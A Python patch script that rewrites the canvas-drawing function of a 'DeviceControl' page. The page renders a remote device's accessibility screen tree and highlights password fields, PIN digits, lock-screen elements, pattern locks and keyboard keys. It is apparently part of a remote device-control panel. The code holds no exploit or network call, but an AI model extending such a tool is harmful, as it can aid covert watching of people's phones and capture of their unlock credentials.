import io
p = r"C:\Users\user\kryptos\server\web-app\src\pages\DeviceControl.tsx"
s = io.open(p, encoding="utf-8", newline="").read()
start = s.index("const drawElement = (")
end = s.index("\n};", start)
new_fn = '''const drawElement = (
  ctx: CanvasRenderingContext2D,
  node: ScreenReaderNode,
  textScale: number,
  designTheme: 'cyan' | 'matrix' | 'neon-red' | 'purple-glowing',
  opacity: number = 0.7,
  cornerStyle: 'brackets' | 'full-border' | 'dots' | 'none' = 'brackets',
  showCoords: boolean = false
) => {
  if (!node || !node.bounds) return;
  const { x, y, w, h } = node.bounds;
  if (w < 3 || h < 3) return;

  const nodeAny = node as any;
  let text = node.text?.trim() || node.desc?.trim() || '';
  if (!text && nodeAny.extra_text) text = nodeAny.extra_text;
  if (!text && nodeAny.extra_label) text = nodeAny.extra_label;
  if (!text && nodeAny.tooltip) text = nodeAny.tooltip;
  if (!text && nodeAny.stateDesc) text = nodeAny.stateDesc;
  if (text === 'true' || text === 'false') text = '';

  const isInput = isInputField(node);
  const isKey = isKeyboardKey(node) || nodeAny.isKeyboardKey === true;
  const isLock = isLockScreenElement(node);
  const interactive = !!(node.clickable || node.editable || node.password || node.isPinDigit || isInput || isKey);

  if (node.password) {
    const dots = (text.match(/[•·—–●*]/g) || []).length;
    text = dots > 0 ? '•'.repeat(Math.min(dots, 12)) : '••••';
  }

  let box = 'rgba(255,255,255,0.05)';
  let border = 'rgba(255,255,255,0.16)';
  let fg = '#e9eef7';
  let bw = 1;

  if (designTheme === 'matrix') { box = 'rgba(0,45,12,0.55)'; border = 'rgba(57,255,20,0.35)'; fg = '#b9ffb2'; }
  else if (designTheme === 'neon-red') { box = 'rgba(48,0,0,0.6)'; border = 'rgba(255,70,70,0.42)'; fg = '#ffd2d2'; }
  else if (designTheme === 'purple-glowing') { box = 'rgba(45,0,40,0.6)'; border = 'rgba(244,114,182,0.42)'; fg = '#ffd8f2'; }

  if (node.password) { box = 'rgba(255,43,43,0.22)'; border = '#ff2b2b'; fg = '#ffffff'; bw = 2; }
  else if (node.isPinDigit) { box = 'rgba(255,140,0,0.22)'; border = '#ff9500'; fg = '#fff4e6'; bw = 2; }
  else if (isInput) { box = 'rgba(34,197,94,0.18)'; border = '#22c55e'; fg = '#eafff1'; bw = 2; }
  else if (node.clickable || isKey) { box = 'rgba(255,43,43,0.14)'; border = 'rgba(255,43,43,0.8)'; fg = '#ffecec'; bw = 1.5; }
  else if (isLock) { box = 'rgba(255,43,43,0.14)'; border = 'rgba(255,43,43,0.65)'; fg = '#ffecec'; }

  const radius = Math.min(7, w / 5, h / 5);
  const drawBox = interactive || !!text;
  if (drawBox) {
    ctx.fillStyle = box;
    ctx.beginPath();
    safeRoundRect(ctx, x, y, w, h, radius);
    ctx.fill();

    ctx.strokeStyle = border;
    ctx.lineWidth = bw;
    if (cornerStyle === 'brackets') {
      const len = Math.max(3, Math.min(8, w / 4, h / 4));
      ctx.beginPath(); ctx.moveTo(x + len, y); ctx.lineTo(x, y); ctx.lineTo(x, y + len); ctx.stroke();
      ctx.beginPath(); ctx.moveTo(x + w - len, y); ctx.lineTo(x + w, y); ctx.lineTo(x + w, y + len); ctx.stroke();
      ctx.beginPath(); ctx.moveTo(x, y + h - len); ctx.lineTo(x, y + h); ctx.lineTo(x + len, y + h); ctx.stroke();
      ctx.beginPath(); ctx.moveTo(x + w - len, y + h); ctx.lineTo(x + w, y + h); ctx.lineTo(x + w, y + h - len); ctx.stroke();
    } else if (cornerStyle === 'full-border') {
      ctx.beginPath(); safeRoundRect(ctx, x, y, w, h, radius); ctx.stroke();
    } else if (cornerStyle === 'dots') {
      ctx.setLineDash([2, 3]); ctx.beginPath(); safeRoundRect(ctx, x, y, w, h, radius); ctx.stroke(); ctx.setLineDash([]);
    }
  }

  if (node.isPatternLock && w > 40 && h > 40) {
    const rows = nodeAny.gridRows || 3;
    const cols = nodeAny.gridCols || 3;
    const rr2 = Math.min(w / (cols * 4), h / (rows * 4));
    ctx.fillStyle = 'rgba(255,43,43,0.9)';
    for (let rr = 0; rr < rows; rr++) {
      for (let cc = 0; cc < cols; cc++) {
        ctx.beginPath();
        ctx.arc(x + (cc + 0.5) * (w / cols), y + (rr + 0.5) * (h / rows), rr2, 0, Math.PI * 2);
        ctx.fill();
      }
    }
  }

  if (text && w > 10 && h > 9) {
    let fs = Math.min(20, Math.max(9, Math.min(h * 0.5, (w - 8) / (text.length * 0.55))));
    if (isKey && text.length <= 2) fs = Math.min(26, h * 0.55);
    fs = Math.round(fs * textScale);
    if (fs >= 8) {
      ctx.font = (interactive ? '700 ' : '500 ') + fs + 'px "Segoe UI", system-ui, sans-serif';
      ctx.fillStyle = fg;
      ctx.textAlign = 'center';
      ctx.textBaseline = 'middle';
      const maxW = w - 6;
      let dt = text;
      if (ctx.measureText(dt).width > maxW) {
        while (dt.length > 1 && ctx.measureText(dt + '…').width > maxW) dt = dt.slice(0, -1);
        dt = dt + '…';
      }
      ctx.fillText(dt, x + w / 2, y + h / 2);
    }
  }

  if (showCoords) {
    ctx.font = '500 9px monospace';
    ctx.fillStyle = 'rgba(255,255,255,0.4)';
    ctx.textAlign = 'left';
    ctx.textBaseline = 'bottom';
    ctx.fillText(Math.round(x) + ',' + Math.round(y) + ' ' + Math.round(w) + 'x' + Math.round(h), x + 2, y + h - 1);
  }
};
'''
s = s[:start] + new_fn + s[end+3:]
io.open(p, "w", encoding="utf-8", newline="").write(s)
print("OK drawElement", start, end)